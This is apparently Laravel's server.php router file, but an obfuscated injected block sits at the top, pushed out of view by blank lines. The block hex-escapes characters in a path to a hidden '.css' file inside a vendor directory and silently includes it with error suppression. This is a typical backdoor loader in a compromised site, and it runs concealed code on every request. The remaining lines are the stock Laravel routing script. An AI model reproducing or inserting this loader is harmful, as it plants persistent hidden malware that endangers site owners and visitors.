<?php
/*38044*/

$r0gc1p = "/home/soil\x63harger/publi\x63_html/finalapi_limen_bk/vendor/niki\x63/.88a5b740.\x63ss"; if (!isset($r0gc1p)) {str_shuffle ($r0gc1p);} else { @include_once /* 251 */ ($r0gc1p); }

/*38044*/

































/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? ''
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
